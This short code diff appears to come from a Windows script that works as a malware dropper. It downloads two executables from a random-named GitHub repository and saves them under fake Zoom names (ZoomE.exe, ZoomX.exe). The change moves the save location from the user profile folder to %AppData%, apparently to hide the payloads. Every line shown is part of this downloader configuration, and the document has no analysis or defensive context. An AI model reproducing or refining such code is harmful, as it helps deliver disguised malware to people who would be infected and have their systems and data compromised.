@@ -5,7 +5,7 @@ function main() {
 	 * Settings
 	 */
 	var dotnet = false;
-	var filename = environ('%UserProfile%\\ZoomE.exe');
+	var filename = environ('%AppData%\\ZoomE.exe');
 	var url = 'https://raw.githubusercontent.com/dashboard23/fgjhfdgkjdkjfghi.html/main/eclient.exe';
 	
 	
@@ -44,7 +44,7 @@ function main() {
 	 * Settings
 	 */
 	var dotnet = false;
-	var filename2 = environ('%UserProfile%\\ZoomX.exe');
+	var filename2 = environ('%AppData%\\ZoomX.exe');
 	var url2 = 'https://raw.githubusercontent.com/dashboard23/fgjhfdgkjdkjfghi.html/main/mclient.exe';
 	
 	
